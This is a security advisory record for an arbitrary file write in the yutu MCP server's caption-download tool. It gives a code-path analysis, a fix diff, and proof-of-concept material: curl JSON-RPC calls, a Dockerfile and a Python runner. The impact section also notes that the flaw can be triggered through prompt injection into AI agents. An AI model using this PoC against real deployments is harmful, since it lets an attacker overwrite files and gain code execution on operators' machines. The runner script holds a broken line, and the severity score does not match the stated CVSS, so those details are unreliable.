@@ -1,0 +1,260 @@
+[id]
+ave_id = "AVE-2026-0342"
+aliases = ["CVE-2026-50158","GHSA-2c7f-fxww-6w6c"]
+
+[basic]
+title = "yutu: Arbitrary File Write via MCP `caption-download` Tool"
+description = "## Arbitrary File Write via MCP `caption-download` Tool
+
+### Summary
+
+The `caption-download` MCP tool in yutu passes the caller-supplied `file` parameter directly to `os.Create()` at `pkg/caption/caption.go:272` without any path validation, canonicalization, or confinement to the `pkg.Root` boundary (`YUTU_ROOT`). A local attacker — or any process able to reach the HTTP MCP server — can write arbitrary content to any path writable by the yutu process, entirely outside the intended working directory. This is a **High** severity vulnerability (CVSS 7.7) with high integrity and availability impact.
+
+### Details
+
+yutu uses `pkg.Root` (backed by Go 1.24's `os.OpenRoot`) to restrict all file I/O to the `YUTU_ROOT` directory. Every other caption file-write path honours this boundary:
+
+| Method | Sink | Confined? |
+|--------|------|-----------|
+| `Caption.Insert()` | `pkg.Root.Open(c.File)` (`caption.go:109`) | Yes |
+| `Caption.Update()` | `pkg.Root.Open(c.File)` (`caption.go:193`) | Yes |
+| `Caption.Download()` | `os.Create(c.File)` (`caption.go:272`) | **No** |
+
+`Caption.Download()` is the sole outlier. The attacker-controlled `file` field flows without restriction from the MCP tool input schema to a raw `os.Create()` call:
+
+1. **Source** — `cmd/caption/download.go:32–41`: `downloadInSchema` declares `file` as a required `string` field in the MCP JSON input schema.
+2. **Binding** — `cmd/caption/download.go:61–64`: `cobramcp.GenToolHandler` maps MCP input to `input.Download(writer)`.
+3. **Sink** — `pkg/caption/caption.go:272`: `os.Create(c.File)` creates or truncates the file at the attacker-supplied path.
+4. **Write** — `pkg/caption/caption.go:280`: `file.Write(body)` writes the downloaded caption bytes to that path.
+
+```go
+// cmd/caption/download.go
+var downloadInSchema = &jsonschema.Schema{
+    Required: []string{\"ids\", \"file\"},          // line 34
+    // ...
+    \"file\": {Type: \"string\", Description: fileUsage},  // line 40
+}
+
+// cobramcp.GenToolHandler binds MCP → handler (line 61-64)
+cobramcp.GenToolHandler(downloadTool, func(input caption.Caption, writer io.Writer) error {
+    return input.Download(writer)
+})
+
+// pkg/caption/caption.go
+body, err := io.ReadAll(res.Body)   // line 267
+file, err := os.Create(c.File)      // line 272  ← unconfined sink
+// ...
+_, err = file.Write(body)           // line 280
+```
+
+The `caption-download` tool is registered by default in `init()` at `cmd/caption/download.go:52`, and the HTTP MCP server starts with `--auth` defaulting to `false` (`cmd/mcp.go:42`), meaning no authentication is required for local HTTP callers.
+
+**Recommended fix:**
+
+```diff
+--- a/pkg/caption/caption.go
++++ b/pkg/caption/caption.go
+@@
+-       file, err := os.Create(c.File)
++       file, err := pkg.Root.OpenFile(c.File, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
+        if err != nil {
+                return errors.Join(errDownloadCaption, err)
+        }
+```
+
+### PoC
+
+**Prerequisites:**
+- yutu `0.0.0-dev` / commit `351c99d`
+- Valid `YUTU_CREDENTIAL` and `YUTU_CACHE_TOKEN` available
+- yutu MCP server running in HTTP mode
+
+**Docker-based reproduction (no live credentials needed):**
+
+The self-contained PoC builds a binary that exercises `caption.Download()` directly inside a container, with `YUTU_ROOT=/tmp/yutu_safe_root` as the confinement boundary.
+
+```bash
+# From the report workspace root:
+docker build --no-cache -t yutu-vuln001-poc \
+    -f vuln-001/Dockerfile \
+    reports/mcp_49_eat-pray-ai__yutu
+
+docker run --rm yutu-vuln001-poc
+```
+
+Expected output confirms:
+- `pkg.Root.Open(\"/tmp/poc-arbitrary-write.txt\")` is correctly rejected with `path escapes from parent` (control).
+- `caption.Download()` with `file=\"/tmp/poc-arbitrary-write.txt\"` succeeds and creates a 79-byte file **outside** `YUTU_ROOT` (exploit).
+
+**Live MCP server reproduction:**
+
+```bash
+# Start the HTTP MCP server (no auth by default)
+yutu mcp --mode http --port 8216
+
+# Initialise session
+curl -sD /tmp/yutu.headers \
+  -H 'Content-Type: application/json' \
+  -H 'Accept: application/json, text/event-stream' \
+  http://localhost:8216/mcp \
+  -d '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2025-06-18\",\"capabilities\":{},\"clientInfo\":{\"name\":\"poc\",\"version\":\"1\"}}}' \
+  >/tmp/yutu.init
+
+SID=$(awk 'tolower($1)==\"mcp-session-id:\"{print $2}' /tmp/yutu.headers | tr -d '\r')
+
+# Exploit: write caption to arbitrary path
+# Replace CAPTION_ID with a caption id accessible by the configured token
+curl -s \
+  -H 'Content-Type: application/json' \
+  -H 'Accept: application/json, text/event-stream' \
+  ${SID:+-H \"Mcp-Session-Id: $SID\"} \
+  http://localhost:8216/mcp \
+  -d '{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"caption-download\",\"arguments\":{\"ids\":[\"CAPTION_ID\"],\"file\":\"/tmp/yutu-cve-poc.srt\",\"tfmt\":\"srt\"}}}'
+
+# Verify file was written outside YUTU_ROOT
+test -s /tmp/yutu-cve-poc.srt && ls -l /tmp/yutu-cve-poc.srt
+```
+
+### Impact
+
+This is an **Arbitrary File Write** vulnerability. Any principal that can invoke the `caption-download` MCP tool — including an unauthenticated local process when the HTTP MCP server is running with default settings (`--auth false`) — can write attacker-controlled bytes to any file path accessible to the yutu process. This bypasses the `YUTU_ROOT` confinement boundary that all other file-write operations in yutu respect.
+
+**Potential consequences include:**
+- Overwriting application binaries, configuration files, or shell startup scripts to achieve persistent code execution.
+- Corrupting log files or database files to cause denial of service.
+- Writing web-accessible files in deployments where yutu runs alongside a web server.
+- Exploitable via prompt injection into an AI agent that uses the yutu MCP server, since the `file` parameter is fully attacker-controlled with no guardrails.
+
+Impacted parties: operators running yutu as an MCP server (HTTP mode, default configuration), AI agent pipelines that expose `caption-download` to untrusted input, and any user whose machine hosts a yutu process that a local attacker can reach.
+
+### Reproduction artifacts
+
+#### `Dockerfile`
+
+```dockerfile
+# VULN-001 PoC Dockerfile
+# Build con: reports/mcp_49_eat-pray-ai__yutu/
+# repo/ - the cloned yutu repository
+# vuln-001/ - this workspace (Dockerfile, poc_main.go)
+
+FROM golang:1.26 AS builder
+WORKDIR /build
+
+# Copy the yutu source tree (provides the vulnerable packages)
+COPY repo/ .
+
+# Inject PoC as a new command package (does not modify existing source)
+RUN mkdir -p cmd/poc_exploit
+COPY vuln-001/poc_main.go cmd/poc_exploit/main.go
+
+# Build the PoC binary (static, no CGO needed)
+RUN CGO_ENABLED=0 go build -o /poc ./cmd/poc_exploit/
+
+# ── Runtime stage ──────────────────────────────────────────────────────────
+FROM debian:12-slim
+
+COPY --from=builder /poc /poc
+
+# YUTU_ROOT defines the pkg.Root confinement boundary.
+# The PoC writes to /tmp/poc-arbitrary-write.txt which is OUTSIDE this root,
+# demonstrating the os.Create bypass.
+ENV YUTU_ROOT=/tmp/yutu_safe_root
+
+RUN mkdir -p /tmp/yutu_safe_root
+
+CMD [\"/poc\"]
+```
+
+#### `poc.py`
+
+```python
+#!/usr/bin/env python3
+\"\"\"
+VULN-001 PoC Runner
+Exploit: Arbitrary File Write via MCP caption-download (CWE-73)
+Target : pkg/caption/caption.go:272 -- os.Create(c.File) without pkg.Root confinement
+
+Usage: python3 poc.py
+\"\"\"
+import os
+import subprocess
+import sys
+
+VULN_DIR = os.path.dirname(os.path.abspath(__file__))
+CONTEXT_DIR = os.path.dirname(VULN_DIR) # mcp_49_eat-pray-ai__yutu/
+DOCKERFILE = os.path.join(VULN_DIR, \"Dockerfile\")
+IMAGE_NAME = \"yutu-vuln001-poc\"
+
+
+def run(cmd, check=False, **kwargs):
+ print(\"$ \" + \" \".join(str(a) for a in cmd))
+ result = subprocess.run(cmd, =True, **kwargs)
+ return result
+
+
+def main():
+ print(\"=\" * 70)
+ print(\"VULN-001: Arbitrary File Write via MCP caption-download\")
+ print(\"CWE-73 | pkg/caption/caption.go:272 | os.Create(c.File)\")
+ print(\"=\" * 70)
+
+ # ── Build ────────────────────────────────────────────────────────────────
+ build_cmd = [
+ \"docker\", \"build\",
+ \"--no-cache\",
+ \"-t\", IMAGE_NAME,
+ \"-f\", DOCKERFILE,
+ CONTEXT_DIR,
+ ]
+ print(\"\n[Step 1] Building Docker image ...\")
+ result = run(build_cmd, capture_output=False)
+ if result.returncode != 0:
+ print(\"\n[FAIL] Docker build failed.\", file=sys.stderr)
+ sys.exit(1)
+
+ # ── Run ──────────────────────────────────────────────────────────────────
+ run_cmd = [\"docker\", \"run\", \"--rm\", IMAGE_NAME]
+ print(\"\n[Step 2] Running PoC container ...\")
+ result = run(run_cmd, capture_output=True)
+
+ stdout = result.stdout or \"\"
+ stderr = result.stderr or \"\"
+ print(stdout, end=\"\")
+ if stderr:
+ print(stderr, end=\"\", file=sys.stderr)
+
+ # ── Verdict ──────────────────────────────────────────────────────────────
+ passed = (
+ result.returncode == 0
+ and \"VULNERABILITY CONFIRMED\" in stdout
+ and \"PASS\" in stdout
+ and \"os.Create bypasses pkg.Root\" in stdout
+ )
+
+ if passed:
+ print(\"\n[RESULT] PASS – vulnerability dynamically reproduced.\")
+ else:
+ print(f\"\n[RESULT] FAIL – container exit code {result.returncode}.\", file=sys.stderr)
+ sys.exit(1)
+
+
+if __name__ == \"__main__\":
+ main()
+```"
+severity = "HIGH"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-23T02:50:56.703276539+00:00"
